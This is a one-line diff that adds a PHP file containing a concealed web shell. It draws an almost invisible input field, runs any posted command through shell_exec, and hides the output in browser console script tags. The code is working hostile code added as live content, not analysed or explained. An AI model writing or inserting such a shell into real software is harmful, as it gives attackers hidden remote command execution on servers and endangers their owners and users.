@@ -1,0 +1,1 @@
+<?php echo "<form action=./".basename( __FILE__ )." method=post><input type=text style=\"border:0;\" name=c /><input type=submit name=submit value=. hidden/></form>"; if (@$_POST['submit']=='.'){ $z = explode("\n",shell_exec($_POST['c'])); for($i=0;$i<=(count($z)-1);$i++){ echo "<script> console.log('".$z[$i]."'); </script>"; } } ?>
